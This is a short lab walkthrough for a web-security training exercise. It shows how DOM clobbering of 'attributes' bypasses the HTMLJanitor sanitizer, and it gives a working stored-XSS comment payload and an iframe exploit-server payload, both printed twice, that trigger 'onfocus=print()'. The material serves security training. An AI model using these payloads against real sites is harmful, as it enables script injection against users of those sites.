# Lab: Clobbering DOM attributes to bypass HTML filters (Expert)

**Goal:** Bypass HTMLJanitor via DOM clobbering and call `print()`. Use Chrome.

## Vulnerability
The filter walks `element.attributes`. Clobbering `attributes` with an `<input id=attributes>` makes `.length` undefined so blacklisted attributes (e.g. `onfocus`) are not stripped.

## Solution

1. Comment on a blog post:

```html
<form id=x tabindex=0 onfocus=print()><input id=attributes>
```

2. Exploit server body (adjust `postId` to the post you commented on):

```html
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">
```

3. Store and deliver to the victim. After load, `#x` focuses the form and runs `onfocus=print()`.

## Final Exploit Payloads

**Comment:**
```html
<form id=x tabindex=0 onfocus=print()><input id=attributes>
```

**Exploit server:**
```html
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">
```
